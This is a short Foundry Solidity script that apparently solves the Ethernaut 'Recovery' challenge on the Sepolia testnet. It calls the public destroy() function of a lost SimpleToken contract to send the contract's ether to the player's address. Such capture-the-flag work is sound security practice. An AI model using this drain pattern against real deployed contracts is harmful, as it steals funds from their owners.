// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

//import "../src/Cracked17_Recovery.sol";

interface ISimpleToken {
    // clean up after ourselves
    function destroy(address payable _to) external;
}

//forge script  --rpc-url sepolia --account metamask  Cracked17_RecoveryScript --broadcast
contract Cracked17_RecoveryScript is Script {
    address ethernaut_contracts;
    address ethernaut_contracts_child;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Recovery_address"));
        ethernaut_contracts_child = vm.parseAddress(vm.envString("Recovery_SimpleToken_address"));
    }

    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));

        ISimpleToken(ethernaut_contracts_child).destroy(payable(player));
        require(ethernaut_contracts_child.balance == 0, " fail");

        vm.stopBroadcast();
    }
}
